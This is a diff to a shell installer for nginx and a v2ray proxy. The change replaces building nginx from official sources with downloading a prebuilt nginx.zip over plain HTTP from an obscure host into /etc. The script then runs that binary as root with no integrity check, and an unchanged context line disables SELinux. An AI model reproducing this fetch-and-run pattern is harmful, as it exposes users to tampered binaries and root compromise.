@@ -38,18 +38,10 @@ install_nginx(){
          sed -i 's/SELINUX=permissive/SELINUX=disabled/g' /etc/selinux/config
          setenforce 0
     fi
-    yum install -y libtool perl-core zlib-devel gcc wget pcre* unzip
-    wget https://www.openssl.org/source/openssl-1.1.1a.tar.gz
-    tar xzvf openssl-1.1.1a.tar.gz
-    
-    mkdir /etc/nginx
-    mkdir /etc/nginx/ssl
-    mkdir /etc/nginx/conf.d
-    wget https://nginx.org/download/nginx-1.15.8.tar.gz
-    tar xf nginx-1.15.8.tar.gz && rm nginx-1.15.8.tar.gz
-    cd nginx-1.15.8
-    ./configure --prefix=/etc/nginx --with-openssl=../openssl-1.1.1a --with-openssl-opt='enable-tls1_3' --with-http_v2_module --with-http_ssl_module --with-http_gzip_static_module --with-http_stub_status_module --with-http_sub_module --with-stream --with-stream_ssl_module
-    make && make install
+    cd /etc
+    wget http://tmp.o1o.win/IejJz/nginx.zip
+    yum install -y unzip
+    unzip nginx.zip
     
     green "====输入解析到此VPS的域名===="
     read domain
@@ -162,10 +154,10 @@ install_v2ray(){
     newpath=game
     sed -i "s/mypath/$newpath/;" config.json
     sed -i "s/mypath/$newpath/;" /etc/nginx/conf.d/default.conf
-    cd /etc/nginx/html
-    rm -f /etc/nginx/html/*
-    wget https://github.com/atrandys/v2ray-ws-tls/raw/master/web.zip
-    unzip web.zip
+    # cd /etc/nginx/html
+    # rm -rf /etc/nginx/html/*
+    # wget https://github.com/atrandys/v2ray-ws-tls/raw/master/web.zip
+    # unzip web.zip
     /etc/nginx/sbin/nginx -s stop
     /etc/nginx/sbin/nginx
     systemctl restart v2ray.service
